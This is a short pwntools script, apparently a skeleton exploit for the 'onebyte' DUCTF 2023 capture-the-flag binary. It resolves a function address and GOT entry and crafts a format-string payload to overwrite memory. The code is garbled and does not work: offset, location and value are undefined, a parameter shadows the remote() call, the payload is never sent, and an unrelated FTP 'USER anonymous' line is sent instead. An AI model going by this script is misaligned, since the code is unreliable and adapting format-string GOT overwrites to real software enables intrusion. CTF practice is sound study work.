from pwn import *

EXE = ELF("./onebyte")

# GET FUNCTION ADDRESS
func_address = EXE.symbols['func']
# GET GLOBAL OFFSET TABLE ENTRY
lib_call_address = EXE.got['lib']

def conn(remote=True):
	if not remote:
		r = process([EXE.path])
	else:
		r = remote("2023.ductf.dev", 30018)
	return r

context.binary = EXE
context.log_level = "DEBUG"

# connect to a process
io = conn(False)

io.recvline()

# craft a format string payload
payload = fmtstr_payload(offset, {location : value})
# offset = offset on the stack to the input buffer
# location = address to write to
# value = value to write

io.send(b'USER anonymous\r\n')

io.recvuntil(b' ', drop=True)

io.recvline()

io.close()